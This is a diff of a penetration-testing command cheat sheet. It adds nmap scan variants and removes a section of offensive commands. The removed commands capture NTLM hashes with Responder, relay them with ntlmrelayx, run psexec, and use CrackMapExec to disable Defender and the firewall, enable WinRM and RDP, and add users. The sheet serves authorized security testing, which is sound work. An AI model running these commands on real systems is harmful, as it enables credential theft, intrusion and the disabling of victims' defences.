@@ -6,7 +6,15 @@ nmap -sS -p- --open -n -Pn <ip> -oG <name>
 ```
 ## nmap - savitar sVC
 ```
-nmap -sCV -p<ports> <ip> -oA <name> --stylesheet /home/kermit/nmap-bootstrap.xsl
+nmap -sCV -p<ports> <ip> -oN <name>
+```
+## nmap - savitar sVC XML
+```
+nmap -sCV -p<ports> <ip> -oX <name>.xml
+```
+## nmap bootstrap
+```
+nmap -sCV -p<ports> -vvv <ip> --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oX <name>
 ```
 ##nmap - ipv6
 ```
@@ -105,56 +113,4 @@ wfuzz -c -t 200 --hc=404 <directory> <url>
 ## wafw00f
 ```
 wafw00f <url>
-```
-## responder netNTLMv2 hashes
-```
-responder -I <interface> -wdv | tee -a <hashes>; grep "Hash" <hashes> | awk '{print $2}' FS=": " | tee >(sed $'s/\033[[][^A-Za-z]*m//g' > <hashes>)
-```
-## rustscan
-```
-rustscan -a <ip> --ulimit 100 -t 5 -- -n -Pn -oG <name>
-```
-## rustscan ports
-```
-rustscan -a <ip> --ulimit 100 -t 5 -p<ports> -- -n -Pn -sCV -oN <name>
-```
-## cme enable winrm
-```
-cme smb <ip> -u '<user>' -p '<pass>' -x 'powershell Enable-PSRemoting'
-```
-## cme --loggedon-users
-```
-cme smb <ip> -u '<user>' -p '<pass>' --loggedon-users
-```
-## cme create user
-```
-cme smb <ip> -u '<user>' -p '<password>' 'net user <user> /add'
-```
-## cme execution policy
-```
-cme smb <ip> -u '<user>' -p '<password>' 'Set-ExecutionPolicy unrestricted'
-```
-## cme disable defender
-```
-cme smb <ip> -u '<user>' -p '<password>' 'Set-MpPreference -DisableRealtimeMonitoring $true'
-```
-## cme disable firewall
-```
-cme smb <ip> -u '<user>' -p '<password>' 'NetSh Advfirewall set allprofiles state off'
-```
-## cme enable rdp
-```
-cme smb <ip> -u '<user>' -p '<password>' -M rdp -o action=enable 
-```
-## responder NTLM relay
-```
-responder -I <interface> -wdv
-```
-## ntlmrelay ipv6
-```
-ntlmrelayx.py -6 -wh 192.168.1.76 -t smb://<ip> -socks -debug -smb2support
-```
-## impacket wmiexec
-```
-impacket-psexec s4vicorp.local/<user>:'<pass>'@<ip> powershell.exe
 ```
